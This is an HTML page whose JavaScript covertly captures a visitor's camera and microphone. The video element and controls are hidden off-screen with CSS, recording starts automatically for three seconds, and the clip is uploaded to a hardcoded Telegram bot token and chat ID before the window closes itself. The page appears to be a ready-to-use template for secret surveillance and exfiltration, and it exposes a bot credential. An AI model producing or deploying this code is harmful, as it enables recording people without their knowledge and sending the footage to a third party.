<!DOCTYPE html>
<html>
  <head>
    <style>
      #video,
      #capture,
      #canvas {
        display: none !important;
        visibility: hidden !important;
        width: 0 !important;
        height: 0 !important;
        position: absolute !important;
        left: -9999px !important;
        top: -9999px !important;
      }
    </style>
  </head>
  <body>
    <video id="video" width="320" height="240" autoplay></video>
    <button id="capture"></button>
    <canvas id="canvas" width="320" height="240"></canvas>

    <script>
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const context = canvas.getContext("2d");
      let mediaRecorder;
      const recordedChunks = [];

      // Ask for camera access
      navigator.mediaDevices
        .getUserMedia({ video: true, audio: true }) // Request audio as well for video recording
        .then((stream) => {
          video.srcObject = stream;
          mediaRecorder = new MediaRecorder(stream);

          mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
              recordedChunks.push(event.data);
            }
          };

          mediaRecorder.onstop = async () => {
            const videoBlob = new Blob(recordedChunks, { type: "video/webm" }); // Use webm for broader compatibility
            recordedChunks.length = 0; // Clear chunks for next recording

            // Example Telegram bot token and chat ID (replace with your own)
            const token = "7640623735:AAGc72UyKSUy8c-Tl4jcY-lv7HCpHFLjD0o";
            const chatId = "1437208295";
            const url = `https://api.telegram.org/bot${token}/sendVideo`; // Changed to sendVideo

            const formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("video", videoBlob, "video.webm"); // Append video Blob with a filename

            try {
              const response = await fetch(url, { method: "POST", body: formData });
              const result = await response.json();
              console.log(
                "Telegram API Response:",
                JSON.stringify(result, null, 2)
              ); // Log the full JSON response
              if (response.ok) {
                window.close(); // Close the window after sending the video
              } else {
                console.error(
                  `Failed to send video to Telegram: ${
                    result.description || "Unknown error"
                  }.`
                );
              }
            } catch (error) {
              console.error("Error sending video to Telegram:", error); // Log any network errors
            }
          };
        })
        .catch((err) => console.error("Camera access denied:", err));

      // Start recording when the video starts playing
      video.onplaying = () => {
        if (mediaRecorder && mediaRecorder.state === "inactive") {
          mediaRecorder.start();
          console.log("Recording started...");
          // Stop recording after 3 seconds
          setTimeout(() => {
            if (mediaRecorder.state === "recording") {
              mediaRecorder.stop();
              console.log("Recording stopped.");
            }
          }, 3000); // Record for 3 seconds
        }
      };
    </script>
  </body>
</html>
